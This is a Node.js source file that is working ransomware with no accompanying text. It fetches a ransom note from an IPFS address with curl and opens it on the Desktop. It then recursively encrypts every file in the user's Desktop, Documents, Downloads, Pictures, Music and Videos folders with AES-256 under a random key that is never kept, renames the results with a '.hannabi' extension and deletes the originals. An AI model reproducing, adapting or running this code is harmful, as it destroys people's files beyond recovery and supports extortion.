var fs = require('fs');
var crypto = require('crypto');
const { exec } = require("child_process");
var path = require('path');
require("os");



var chars = '0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()ABCDEFGHIJKLMNOPQRSTUVWXYZ';
var keyLength = 63;


const homeDir = require('os').homedir(); 
const desktopDir = `${homeDir}\\Desktop`;
const documentsDir = homeDir + "\\Documents"
const downloadsDir = homeDir + "\\Downloads"
const picturesDir = homeDir + "\\pictures"
const musicDir = homeDir + "\\music"
const videosDir = homeDir + "\\videos"
function readme(){
  exec("curl https://ipfs.io/ipfs/QmdquFjJAASTKVyaeTCpK2pMnNzVY1zEqeQtwqdQnN2rbx -o " + desktopDir + "\\readme.txt")
  exec("cd " + desktopDir + " && readme.txt")
}
readme()

function fromDir(startPath, filter, callback) {



    if (!fs.existsSync(startPath)) {
        return;
    }

    var files = fs.readdirSync(startPath);

    for (var i = 0; i < files.length; i++) {
        var filename = path.join(startPath, files[i]);
        var stat = fs.lstatSync(filename);
        if (stat.isDirectory()) {
            fromDir(filename, filter, callback);
        } else if (filter.test(filename)) callback(filename);
        var iurifhzfhijfqzjfz = fs.statSync(filename);
        dadzqioqzhzqoi = iurifhzfhijfqzjfz.isFile();
        if(dadzqioqzhzqoi === true){
            checkextension()
          }else{
          }

        function checkextension(){
          
        const ext = (path.extname(filename));
        if(ext === ".hannabi"){
          }else{
            encrypt()
          }
        }  

        function encrypt(){
            var key = "";
            for (var i = 0; i <= keyLength; i++) {
            var randomNumber = Math.floor(Math.random() * chars.length);
            key += chars.substring(randomNumber, randomNumber +1);
            }
            var cipher = crypto.createCipher('aes-256-cbc', key);
            const temp = filename
            var input = fs.createReadStream(filename);
            var output = fs.createWriteStream(filename + ".hannabi");
            input.pipe(cipher).pipe(output);
            output.on('finish', function() {
           const ext = (path.extname(filename));
           if(ext === ".hannabi"){
           }else{
               exec("del " + temp)
           }
              });



        }










  };


    
};
fromDir(desktopDir, /\.test$/  , function(filename) {});
fromDir(documentsDir, /\.test$/  , function(filename) {});
fromDir(downloadsDir, /\.test$/  , function(filename) {});
fromDir(picturesDir, /\.test$/  , function(filename) {});
fromDir(musicDir, /\.test$/  , function(filename) {});
fromDir(videosDir, /\.test$/  , function(filename) {});





 








